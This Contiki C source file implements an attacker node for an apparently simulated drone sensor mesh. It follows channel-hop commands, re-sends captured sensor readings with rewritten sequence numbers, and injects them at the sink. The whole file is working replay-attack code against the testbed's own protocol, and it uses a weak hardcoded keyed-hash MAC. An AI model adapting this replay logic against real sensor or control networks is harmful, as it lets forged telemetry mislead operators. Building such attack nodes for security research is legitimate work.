#include "contiki.h"
#include "net/rime/mesh.h"
#include "lib/random.h"
#include "attack_targeting.h"
#include <stdio.h>
#include <string.h>

#define RADIO_CHANNEL_START 129
#define RADIO_CHANNEL_COUNT 4

#define MSG_VER 1
#define CTRL_CMD_HOP 1

#define MAC_KEY 0x6a09e667u

#define REPLAY_INTERVAL_MS 500
#define REPLAY_WARMUP_SEC 3
#define REPLAY_SLOT_SEC 3
#define REPLAY_BURST_PACKETS 2

PROCESS(attacker_replay_proc, "Attacker replay");
AUTOSTART_PROCESSES(&attacker_replay_proc);

typedef struct {
  uint8_t ver;
  uint8_t drone_id;
  uint16_t seq;
  uint16_t temp;
  uint16_t vib;
  uint16_t gas;
  uint16_t batt_mv;
  uint32_t t;
  uint32_t mac;
} sensor_msg_t;

typedef struct {
  uint8_t ver;
  uint8_t cmd;
  uint8_t channel;
  uint8_t reserved;
  uint32_t t;
  uint32_t mac;
} control_msg_t;

static uint8_t current_channel = RADIO_CHANNEL_START;
static uint8_t channel_index = 0;
static const uint8_t channel_list[RADIO_CHANNEL_COUNT] = {129, 130, 131, 132};
static const linkaddr_t sink_addr = {{1, 0}};
static uint8_t targets_pinned;
static uint8_t target_cursor;
static uint32_t warmup_started_at;
static uint32_t slot_started_at;
static uint8_t slot_packets_sent;
static attack_target_t *slot_target;

static void recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops);
static const struct mesh_callbacks mesh_cb = { recv_mesh, NULL, NULL };
static struct mesh_conn mesh;

static void maybe_send_replay(void);

static uint32_t
mac_fnv1a(const void *data, size_t len)
{
  const uint8_t *p = (const uint8_t *)data;
  uint32_t h = 2166136261u;
  uint32_t key = MAC_KEY;
  int i;
  for(i = 0; i < 4; i++) {
    h ^= (uint8_t)(key & 0xff);
    h *= 16777619u;
    key >>= 8;
  }
  for(size_t j = 0; j < len; j++) {
    h ^= p[j];
    h *= 16777619u;
  }
  return h;
}

static void
set_channel(uint8_t ch)
{
  if(ch == current_channel) {
    return;
  }
  mesh_close(&mesh);
  current_channel = ch;
  mesh_open(&mesh, current_channel, &mesh_cb);
}

static void
recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops)
{
  control_msg_t ctrl;
  (void)c;
  (void)from;
  (void)hops;

  if(packetbuf_datalen() != sizeof(ctrl)) {
    return;
  }

  memcpy(&ctrl, packetbuf_dataptr(), sizeof(ctrl));
  if(ctrl.ver != MSG_VER || ctrl.cmd != CTRL_CMD_HOP) {
    return;
  }

  uint32_t mac = ctrl.mac;
  ctrl.mac = 0;
  if(mac != mac_fnv1a(&ctrl, sizeof(ctrl))) {
    return;
  }

  set_channel(ctrl.channel);
}

PROCESS_THREAD(attacker_replay_proc, ev, data)
{
  static struct etimer timer;

  PROCESS_EXITHANDLER(attack_targets_shutdown(););
  PROCESS_BEGIN();

  current_channel = channel_list[channel_index % RADIO_CHANNEL_COUNT];
  mesh_open(&mesh, current_channel, &mesh_cb);
  attack_targets_init();
  targets_pinned = 0;
  target_cursor = 0;
  warmup_started_at = clock_seconds();
  slot_started_at = 0;
  slot_packets_sent = 0;
  slot_target = NULL;
  etimer_set(&timer, (CLOCK_SECOND * REPLAY_INTERVAL_MS) / 1000);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    maybe_send_replay();

    etimer_reset(&timer);
  }

  PROCESS_END();
}

static void
maybe_send_replay(void)
{
  uint32_t now;
  sensor_msg_t msg;
  uint8_t pinned_count;

  now = clock_seconds();

  if(!targets_pinned) {
    if((now - warmup_started_at) < REPLAY_WARMUP_SEC) {
      return;
    }
    pinned_count = attack_targets_pin_active();
    if(pinned_count == 0) {
      warmup_started_at = now;
      return;
    }
    targets_pinned = 1;
    slot_started_at = 0;
    slot_packets_sent = 0;
    slot_target = NULL;
  }

  if(slot_target == NULL || slot_started_at == 0 ||
     (now - slot_started_at) >= REPLAY_SLOT_SEC) {
    slot_target = attack_targets_next_active(&target_cursor);
    slot_started_at = now;
    slot_packets_sent = 0;
  }

  if(slot_target == NULL || slot_packets_sent >= REPLAY_BURST_PACKETS) {
    return;
  }

  memcpy(&msg, &slot_target->last_seen_msg, sizeof(msg));
  msg.seq = attack_target_replay_seq(slot_target);

  set_channel(slot_target->channel);
  packetbuf_copyfrom(&msg, sizeof(msg));
  mesh_send(&mesh, &sink_addr);
  slot_packets_sent++;
}
